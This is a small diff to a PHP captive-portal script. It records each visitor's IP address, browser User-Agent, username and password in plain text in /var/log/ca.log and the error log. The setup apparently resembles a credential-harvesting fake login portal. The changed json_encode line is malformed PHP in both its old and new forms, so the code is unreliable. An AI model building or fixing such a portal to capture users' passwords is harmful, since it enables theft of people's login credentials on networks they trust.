@@ -22,7 +22,7 @@ $ua   = substr($_SERVER['HTTP_USER_AGENT'] ?? '-', 0, 180);
 $when = gmdate('c');
 
 $line = json_encode([
-    'Detected_User:'    => $when | 'IP Address' => $ip | 'User-Agent' => $ua | 'Credentials' => ['user' => $user, 'password' => $pwd]
+    'Detected_User:'=> $when '| IP Address' => $ip '| User-Agent' => $ua '| Credentials' => ['user' => $user, 'password' => $pwd]
 ], JSON_UNESCAPED_UNICODE) . PHP_EOL;
 
 $primary = '/var/log/ca.log';
@@ -56,6 +56,7 @@ error_log("captive-portal: $line");
   a{color:#0067b8;text-decoration:none}
   a:hover{text-decoration:underline}
 </style>
+
 
 
 
